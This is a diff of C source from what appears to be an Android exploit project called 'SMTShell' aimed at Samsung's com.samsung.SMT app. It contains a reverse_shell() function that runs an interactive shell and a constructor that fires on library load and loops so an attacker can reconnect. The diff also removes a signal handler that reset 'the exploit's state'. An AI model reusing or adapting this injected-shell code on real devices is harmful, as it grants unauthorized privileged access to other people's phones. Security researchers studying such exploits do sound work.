@@ -7,7 +7,7 @@
 #include <android/log.h>
 #include <signal.h>
 
-#define LOG_TAG "smtshell"
+#define LOG_TAG "SMTShell"
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
@@ -36,22 +36,8 @@ static void reverse_shell() {
     system("/system/bin/sh -i");
 }
 
-/**
- * This is a bit of a hack, but allows us to easily reset the exploit's state,
- * and also kill the reverse shell if the user wants to, using `kill $PPID`.
- */
-void sig_handler(int signo) {
-    if (signo == SIGTERM) {
-        LOGI("caught SIGTERM, clearing SMT data");
-        system("pm clear com.samsung.SMT");
-    }
-}
-
 __attribute__((constructor)) static void on_load() {
-    LOGI("on_load() called, my uid is %d", getuid());
-    if (signal(SIGTERM, sig_handler) == SIG_ERR) {
-        LOGE("can't catch SIGTERM!");
-    }
+    LOGI("reverse shell on_load() called, my uid is %d", getuid());
 
     while (1) {
         // loop so the client can reconnect after exiting
